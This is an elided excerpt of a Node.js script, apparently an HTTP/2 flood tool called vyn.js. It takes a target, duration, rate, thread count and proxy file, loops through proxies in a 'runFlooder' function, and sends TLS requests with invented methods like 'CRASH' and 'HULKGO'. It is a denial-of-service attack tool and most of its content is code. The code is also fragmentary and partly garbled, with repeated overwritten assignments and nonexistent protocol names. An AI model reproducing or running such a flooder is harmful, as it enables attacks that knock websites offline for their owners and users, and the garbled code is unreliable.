...
if (process.argv.length < 5) {
    console.log(`TEKS：\nnode vyn.js web sec rate trhead proxy`);
    process.exit();
}
...
headers[":method"] = "POST";
headers[":method"] = "HEAD";
headers[":method"] = "MIXMAX";
headers[":method"] = "FLAY";
headers[":method"] = "CRASH";
headers[":method"] = "HULKGO";
headers[":method"] = "SPEED";
...
function runFlooder() {
    ...
    if (isFirstVisit) {
        ...
        makeRequest(proxyOptions);
    }
}

function makeRequest(proxyOptions) {
    Socker.HTTP(proxyOptions, (connection, error) => {
        ...
        const tlsOptions = {
            port: 443,
            secure: true,
            ALPNProtocols: ['h4', 'h3', 'h2', 'http/1.1', 'http/1.2', 'http/2.2', 'h1', 'spdy/3.1', 'http/2+quic/43', 'http/2+quic/44', 'http/2+quic/45'],
            ciphers: ciphers,
            sigalgs: sigalgs,
            requestCert: true,
            socket: connection,
